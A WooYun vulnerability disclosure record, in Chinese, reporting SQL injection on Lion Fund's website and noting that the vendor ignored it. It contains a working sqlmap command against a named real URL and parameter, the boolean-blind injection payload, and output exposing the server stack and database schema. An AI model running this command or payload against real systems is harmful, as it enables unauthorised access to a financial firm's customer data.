wybug_title: 基金安全之诺安基金某处存在SQL注入漏洞
wybug_corp: 诺安基金管理有限公司
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-07-22：	细节已通知厂商并且等待厂商处理中									2015-07-27：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：   详细说明：  
sqlmap.py -u "http://www.lionfund.com.cn/chatmain.do?id=2403" --tamper=space2comment --current-db
参数:id


sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=2403 AND 5677=5677---web server operating system: Windowsweb application technology: Servlet 2.4, JSP, Apache 2.2.21, JSP 2.0back-end DBMS: Oraclecurrent schema (equivalent to database on Oracle):    'CUSTOMER'
   漏洞证明：  
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=2403 AND 5677=5677---web server operating system: Windowsweb application technology: Servlet 2.4, JSP, Apache 2.2.21, JSP 2.0back-end DBMS: Oraclecurrent schema (equivalent to database on Oracle):    'CUSTOMER'
   修复方案：  参数过滤   版权声明：转载请注明来源 路人甲@乌云
